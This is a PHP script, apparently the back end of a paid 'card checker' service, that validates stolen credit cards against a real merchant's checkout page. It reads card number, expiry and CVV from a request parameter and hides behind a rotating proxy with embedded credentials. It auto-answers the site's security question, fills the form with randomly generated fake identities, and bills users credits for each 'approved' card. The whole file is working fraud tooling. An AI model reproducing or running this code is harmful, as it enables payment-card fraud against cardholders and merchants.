<?php
// Verificar sesión y créditos
session_start();
$path = $_SERVER["DOCUMENT_ROOT"];
require_once $path . "/api/v1.1/core/brain.php";

if (!isset($_SESSION["user_id"])) {
    echo json_encode(['status1' => 'Error', 'status2' => 'No hay sesión activa']);
    exit;
}

$user = $_SESSION["user_id"];
$query = $connection->prepare("SELECT * FROM breathe_users WHERE id=:id");
$query->bindParam("id", $user, PDO::PARAM_STR);
$query->execute();
$result = $query->fetch(PDO::FETCH_ASSOC);

$credits = $result["creditos"];

if ($credits < 2) {
    echo json_encode(['status1' => 'Error', 'status2' => 'Créditos insuficientes']);
    exit;
}

unlink(__DIR__ . '/chazecok.txt');

$CookieFilesT = tempnam(sys_get_temp_dir(), 'chazecok');

$lista = $_GET['card'];  
$datos_cc = explode("|", $lista); 
 
$cc = $datos_cc[0]; 
$mes = ltrim($datos_cc[1], '0'); 
$ano = $datos_cc[2]; 
$cvv = $datos_cc[3]; 

$ty = ['4'=>'VISA','5'=>'MCRD','6'=> 'DISC'];
$TypeCrd = $ty[substr($cc, 0,1)];

// Configuración de proxy
$proxy = "http://rvrqudhp-rotate:918d6xnqwql1@p.webshare.io:80";

function parseX($data, $start, $end) {
    try {
        $start_pos = strpos($data, $start) + strlen($start);
        $end_pos = strpos($data, $end, $start_pos);
        
        if ($start_pos === false || $end_pos === false) {
            throw new Exception("Delimitadores no encontrados");
        }
        
        return substr($data, $start_pos, $end_pos - $start_pos);
    } catch (Exception $e) {
        return "None";
    }
}

function find_between($text, $start, $end) {
    $start_pos = strpos($text, $start);
    if ($start_pos === false) {
        return '';
    }
    $start_pos += strlen($start);
    $end_pos = strpos($text, $end, $start_pos);
    if ($end_pos === false) {
        return '';
    }
    return substr($text, $start_pos, $end_pos - $start_pos);
}

function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.westnet.ca/checkout.htm?products_id=971');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language: es,en-US;q=0.9,en;q=0.8',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
]); 
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt'); 

// Configurar proxy
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

$response = curl_exec($ch);

$startDelimiter = '<label for="security_answer">';
$endDelimiter = '</label>';

$securityQuestion = parseX($response, $startDelimiter, $endDelimiter);

$securityQuestion = trim($securityQuestion);

if ($securityQuestion == 'Security Question: What is the current year?'){
    $contentx = "2025";
} elseif ($securityQuestion == 'Security Question: What is the capital of Canada?'){
    $contentx = "Ottawa";
} elseif ($securityQuestion == 'Security Question: What is the capital of Alberta?'){
    $contentx = "Edmonton";
}

function obtenerDatosRandomUser() {
    $apiUrl = "https://randomuser.me/api/";
    $response = file_get_contents($apiUrl);
    $data = json_decode($response, true);
    return $data['results'][0];
}

$randomUserApi = obtenerDatosRandomUser();

$email = $randomUserApi['email'];
$nombre = $randomUserApi['name']['first'] . ' ' . $randomUserApi['name']['last'];
$ship_fname = $randomUserApi['name']['first'];
$ship_lname = $randomUserApi['name']['last'];
$ship_street = $randomUserApi['location']['street']['number'] . ' ' . $randomUserApi['location']['street']['name'];
$ship_city = $randomUserApi['location']['city'];
$ship_state = $randomUserApi['location']['state'];
$ship_zip = $randomUserApi['location']['postcode'];
$ship_country = 'US'; 
$ship_phone = $randomUserApi['phone'];

$usernmae = ''.$ship_fname.''.$ship_lname.'@westnet.ca';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.westnet.ca/checkout.htm?products_id=971');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language: es,en-US;q=0.9,en;q=0.8',
    'Cache-Control: no-cache',
    'Connection: keep-alive',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://www.westnet.ca',
    'Referer: https://www.westnet.ca/checkout.htm?products_id=971',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
]);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt'); 

// Configurar proxy para la segunda petición
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

curl_setopt($ch, CURLOPT_POSTFIELDS, 'screen_resolution=1360x768&plan=Spark+Plug&username='.$usernmae.'&password=Sebas.22&first_name='.$nombre.'&last_name='.$ship_lname.'&email='.$email.'&phone='.$ship_phone.'&address=Steet+10%2C+House+13&address2=112&city=Matur%C3%ADn&state=N&postal='.$ship_zip.'&country='.$ship_country.'&security_answer='.$contentx.'&card_number='.$cc.'&exp_month='.$mes.'&exp_year='.$ano.'&cvc='.$cvv.'');

$response = curl_exec($ch);

$startDelimiter = '<div class="message error-message">';
$endDelimiter = '</div>';

$errorMessage = parseX($response, $startDelimiter, $endDelimiter);

$errorMessage = trim($errorMessage);

$response = $errorMessage;

if (strpos($response, "Verified") !== false) {
    $status1 = "Verified";
    $status2 = "⁣¡Aprobada! ✅";
    
    // Cobrar 2 créditos por tarjeta aprobada
    $balance = $credits - 2;
    $query = $connection->prepare("UPDATE breathe_users SET creditos=:creditos WHERE id=:id");
    $query->bindParam("id", $user, PDO::PARAM_STR);
    $query->bindParam("creditos", $balance, PDO::PARAM_STR);
    $query->execute();
} else {
    $status1 = "DECLINED.";
    $status2 = "⁣¡Declinada! ❌";
}
    
$responseArray = array(
    "status1" => $status1,
    "status2" => str_replace("\u2063", "", $status2)
);

header('Content-Type: application/json');
echo json_encode($responseArray);
?> 